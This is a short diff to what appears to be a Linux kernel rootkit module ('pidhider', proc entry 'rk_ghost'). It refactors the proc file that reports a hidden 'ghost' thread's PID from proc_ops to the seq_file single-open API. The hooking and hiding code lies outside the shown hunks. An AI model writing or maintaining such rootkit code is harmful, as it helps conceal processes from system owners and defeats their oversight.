@@ -2,7 +2,6 @@
 #include <linux/types.h>
 #include <linux/dirent.h>
 #include <linux/errno.h>
-#include <linux/fs.h>
 #include <linux/ftrace.h>
 #include <linux/init.h>
 #include <linux/kprobes.h>
@@ -10,6 +9,7 @@
 #include <linux/module.h>
 #include <linux/printk.h>
 #include <linux/proc_fs.h>
+#include <linux/seq_file.h>
 #include <linux/sched.h>
 #include <linux/string.h>
 #include <linux/uaccess.h>
@@ -149,19 +149,13 @@ static int spawn_ghost(void)
 	return 0;
 }
 
-static ssize_t ghost_pid_show(struct file *file, char __user *buffer,
-			      size_t count, loff_t *position)
+static int ghost_pid_show(struct seq_file *m, void *v)
 {
-	char buf[32];
-	int len;
-
-	len = snprintf(buf, sizeof(buf), "%d\n", ghost_thread->pid);
-	return simple_read_from_buffer(buffer, count, position, buf, len);
+	seq_printf(m, "%d\n",
+		   ghost_thread->pid);
+	return 0;
 }
 
-static const struct proc_ops ghost_ops = {
-	.proc_read = ghost_pid_show,
-};
 
 static int __init pidhider_init(void)
 {
@@ -177,7 +171,7 @@ static int __init pidhider_init(void)
 		return err;
 	}
 
-	proc_entry = proc_create("rk_ghost", 0444, NULL, &ghost_ops);
+	proc_entry = proc_create_single("rk_ghost", 0444, NULL, ghost_pid_show);
 	if (!proc_entry) {
 		remove_hook();
 		kthread_stop(ghost_thread);
